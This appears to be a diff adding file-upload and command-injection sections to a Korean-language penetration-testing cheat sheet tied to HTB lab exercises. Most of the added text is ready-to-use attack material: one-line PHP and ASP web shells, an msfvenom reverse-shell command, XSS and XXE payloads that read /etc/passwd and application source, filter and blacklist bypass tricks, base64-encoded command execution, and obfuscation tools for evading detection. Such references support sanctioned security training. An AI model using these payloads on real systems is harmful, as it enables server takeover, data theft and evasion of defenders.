@@ -621,13 +621,229 @@ http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22c
 - [Linux용 단어 목록](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
 - [Windows용 단어 목록](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
 
+<br/><br/>
+# File Upload
 
+## Web Shells
+- [phpbash](https://github.com/Arrexel/phpbash)
+- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
 
+## Writing Custom Web Shell
+```<?php system($_REQUEST['cmd']); ?>```<br/>
+```<% eval request('cmd') %>```
 
+## Reverse Shell
+- [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
 
+## 사용자 정의 Reverse Shell 스크립트 생성
+```msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php```
 
+## Double Extensions
+- [단어 목록](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
+- [PHP 단어 목록](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
+- [ASP 단어 목록](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)
 
+## Character Injection
+- `%20`
+- `%0a`
+- `%00`
+- `%0d0a`
+- `/`
+- `.\`
+- `.`
+- `…`
+- `:`
 
+## Content-Type Filter
+- [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)
+```
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
+cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
+```
+
+## MIME-Type
+- [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures)
+- [Magic Bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)
+
+## XSS
+```exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg```
+
+#### Scalable Vector Graphics(SVG) 이미지 (HTB.svg)
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/javascript">alert(window.origin);</script>
+</svg>
+```
+
+## XXE
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+```
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
+
+<br/><br/>
+# Command Injections
+
+## Command Injection Methods
+| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
+| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
+| Semicolon              | `;`                     | `%3b`                     | Both                                       |
+| New Line               | `\n`                    | `%0a`                     | Both                                       |
+| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
+| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
+| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
+| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
+| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
+| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |
+
+## Injection Operators
+| **Injection Type**                      | **Operators**                                     |
+| --------------------------------------- | ------------------------------------------------- |
+| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
+| Command Injection                       | `;` `&&`                                          |
+| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
+| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
+| OS Command Injection                    | `;` `&` `\|`                                      |
+| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
+| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
+| Object Injection                        | `;` `&` `\|`                                      |
+| XQuery Injection                        | `'` `;` `--` `/* */`                              |
+| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
+| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |
+
+## 공백 필터 우회
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)
+
+## 기타 Blacklisted Characters 우회
+
+### Linux (실제 적용 시 echo는 제외)
+```
+echo ${PATH}
+
+/usr/local/bin:/usr/bin:/bin:/usr/games
+```
+```
+$ echo ${PATH:0:1}
+
+/
+```
+```
+$ echo ${LS_COLORS:10:1}
+
+;
+```
+
+### Windows
+```
+C:\htb> echo %HOMEPATH:~6,-11%
+
+\
+```
+```
+PS C:\htb> $env:HOMEPATH[0]
+
+\
+```
+
+#### PowerShell
+```Get-ChildItem Env:```
+
+### Character Shifting
+```
+$ man ascii     # \ is on 92, before it is [ on 91
+$ echo $(tr '!-}' '"-~'<<<[)
+
+\
+```
+
+## Blacklisted Commands 우회
+
+### Linux & Windows
+```$ w'h'o'am'i```<br/>
+```$ w"h"o"am"i```
+
+### Linux Only
+```who$@ami```<br/>
+```w\ho\am\i```
+
+### Windows Only
+```C:\htb> who^ami```
+
+## Command Obfuscation
+
+### Case Manipulation
+```PS C:\htb> WhOaMi```<br/>
+```$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")```<br/>
+```$(a="WhOaMi";printf %s "${a,,}")```
+
+### Reversed Commands
+```
+$ echo 'whoami' | rev
+imaohw
+
+$ $(rev<<<'imaohw')
+```
+```
+PS C:\htb> "whoami"[-1..-20] -join ''
+imaohw
+
+PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
+```
+
+### Encoded Commands
+```
+$ echo -n 'cat /etc/passwd | grep 33' | base64
+Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+
+$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+```
+```
+PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+
+dwBoAG8AYQBtAGkA
+```
+```
+$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+
+dwBoAG8AYQBtAGkA
+```
+```PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"```
+
+- 참고 : [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)
+
+## Evasion Tools
+
+### Linux (Bashfuscator)
+- [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
+```
+git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator
+pip3 install setuptools==65
+python3 setup.py install --user
+./bashfuscator -c 'cat /etc/passwd'
+./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1     # 짧고 간단하게
+```
+
+### Windows (DOSfuscation)
+- [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)
+```
+PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
+PS C:\htb> cd Invoke-DOSfuscation
+PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
+PS C:\htb> Invoke-DOSfuscation
+Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
+Invoke-DOSfuscation> encoding
+Invoke-DOSfuscation\Encoding> 1
+```
 
 
 
